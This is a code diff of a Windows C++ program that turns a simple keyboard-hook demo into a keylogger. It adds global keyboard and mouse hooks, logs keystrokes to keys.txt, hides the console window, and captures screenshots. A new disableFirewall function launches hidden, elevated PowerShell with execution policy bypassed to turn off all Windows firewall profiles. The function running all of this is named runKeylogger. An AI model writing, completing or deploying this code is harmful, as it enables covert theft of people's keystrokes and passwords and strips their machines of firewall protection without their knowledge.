@@ -3,17 +3,12 @@
 #include <iostream>
 #include <cstdio>
 #include <fstream>
-#include <d3d9.h>
 
-// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
-// or you will get problems since every function uses this variable.
-HHOOK _hook;
+// struktury pro informace o Hooku
+static HHOOK hooks[2];
+static std::fstream keyFile;
 
-// This struct contains the data received by the hook callback. As you see in the callback function
-// it contains the thing you will need: vkCode = virtual key code.
-KBDLLHOOKSTRUCT kbdStruct;
-
-PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp)
+static PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp)
 {
 	BITMAP bmp;
 	PBITMAPINFO pbmi;
@@ -76,7 +71,7 @@ PBITMAPINFO CreateBitmapInfoStruct(HBITMAP hBmp)
 	pbmi->bmiHeader.biClrImportant = 0;
 	return pbmi;
 }
-void CreateBMPFile(LPTSTR pszFile, PBITMAPINFO pbi, HBITMAP hBMP)
+static void CreateBMPFile(LPTSTR pszFile, PBITMAPINFO pbi, HBITMAP hBMP)
 {
 	HANDLE hf;                 // file handle  
 	BITMAPFILEHEADER hdr;       // bitmap file-header  
@@ -156,7 +151,7 @@ void CreateBMPFile(LPTSTR pszFile, PBITMAPINFO pbi, HBITMAP hBMP)
 	// Free memory.  
 	GlobalFree((HGLOBAL)lpBits);
 }
-void captureScreenshot()
+static void captureScreenshot()
 {
 	HDC hdc = GetDC(nullptr); // get the desktop device context
 	HDC hDest = CreateCompatibleDC(hdc); // create a device context to use yourself
@@ -184,21 +179,15 @@ void captureScreenshot()
 	CreateBMPFile("test.bmp", CreateBitmapInfoStruct(hbDesktop), hbDesktop);
 }
 
-
-// This is the callback function. Consider it the event that is raised when, in this case, 
-// a key is pressed.
-LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
+static LRESULT CALLBACK KeyCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode >= 0)
 	{
-		// the action is valid: HC_ACTION.
 		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
 		{
-			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
-			kbdStruct = *((KBDLLHOOKSTRUCT*) lParam);
-
-			printf("%d\n", kbdStruct.vkCode);
-			printf("%d\n", kbdStruct.scanCode);
+			KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+			keyFile << (char) MapVirtualKey(kbdStruct.vkCode, MAPVK_VK_TO_CHAR) << std::endl;
+			keyFile.flush();
 			
 			if (kbdStruct.vkCode == 65)
 			{
@@ -208,43 +197,102 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 	}
 
 	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
-	return CallNextHookEx(_hook, nCode, wParam, lParam);
+	return CallNextHookEx(hooks[0], nCode, wParam, lParam);
+}
+static LRESULT CALLBACK MouseCallback(
+	_In_ int    nCode,
+	_In_ WPARAM wParam,
+	_In_ LPARAM lParam
+)
+{
+	if (nCode >= 0)
+	{
+		if (wParam == WM_MOUSEMOVE)
+		{
+			MSLLHOOKSTRUCT* data = (MSLLHOOKSTRUCT*) lParam;
+			printf("[%d, %d]\n", data->pt.x, data->pt.y);
+		}
+	}
+
+	return CallNextHookEx(hooks[1], nCode, wParam, lParam);
 }
 
-void hideWindow()
+
+static void hideWindow()
 {
-	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), SW_HIDE); // hide window
+	ShowWindow(FindWindowA("ConsoleWindowClass", nullptr), SW_HIDE); // hide window
 }
-void setHook()
+static void setHooks()
 {
-	// Set the hook and set it to use the callback function above
-	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
-	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
-	// function that sets and releases the hook.
-	if (!(_hook = SetWindowsHookEx(
+	if (!(hooks[0] = SetWindowsHookEx(
 		WH_KEYBOARD_LL,	// low level keyboard
-		HookCallback,   // callback
+		KeyCallback,   // callback
 		nullptr,		// current process/dll
 		0)))			// capture all threads
 	{
-		MessageBox(nullptr, // no window
-			"Failed to install hook!",
-			"Error",
-			MB_ICONERROR);
+		MessageBox(nullptr, "Failed to install hook!", "Error", MB_ICONERROR);
+	}
+
+	if (!(hooks[1] = SetWindowsHookEx(
+		WH_MOUSE_LL,	// low level keyboard
+		MouseCallback,   // callback
+		nullptr,		// current process/dll
+		0)))			// capture all threads
+	{
+		MessageBox(nullptr, "Failed to install hook!", "Error", MB_ICONERROR);
 	}
 }
-void releaseHook()
+static void releaseHooks()
 {
-	UnhookWindowsHookEx(_hook);
+	for (int i = 0; i < 2; i++)
+	{
+		UnhookWindowsHookEx(hooks[i]);
+	}
+}
+static BOOL WINAPI closeCallback(DWORD unused)
+{
+	releaseHooks();
+	return true;
 }
 
-int main()
+void disableFirewall()
 {
-	hideWindow();
-	setHook();
-	atexit(releaseHook);
+	std::string command = "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False";
+	std::string args = "-ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"" + command + "\"";
 
+	SHELLEXECUTEINFO shExInfo = { 0 };
+	shExInfo.cbSize = sizeof(shExInfo);
+	shExInfo.fMask = SEE_MASK_NOCLOSEPROCESS; // return process handle
+	shExInfo.hwnd = 0;
+	shExInfo.lpVerb = "runas";
+	shExInfo.lpFile = "powershell.exe";
+	shExInfo.lpParameters = args.c_str();
+	shExInfo.lpDirectory = 0;
+	shExInfo.nShow = SW_HIDE;
+	shExInfo.hInstApp = 0;
+
+	if (ShellExecuteEx(&shExInfo))
+	{
+		WaitForSingleObject(shExInfo.hProcess, INFINITE);
+		CloseHandle(shExInfo.hProcess);
+	}
+}
+void runKeylogger()
+{
+	keyFile = std::fstream("keys.txt", std::ios::out | std::ios::app);
+
+	hideWindow();
+	setHooks();
+	atexit(releaseHooks);
+
+	disableFirewall();
+
+	SetConsoleCtrlHandler(closeCallback, true);
+	
 	// event loop
 	MSG msg;
-	while (GetMessage(&msg, nullptr, 0, 0));
+	while (GetMessage(&msg, nullptr, 0, 0))
+	{
+
+	}
 }
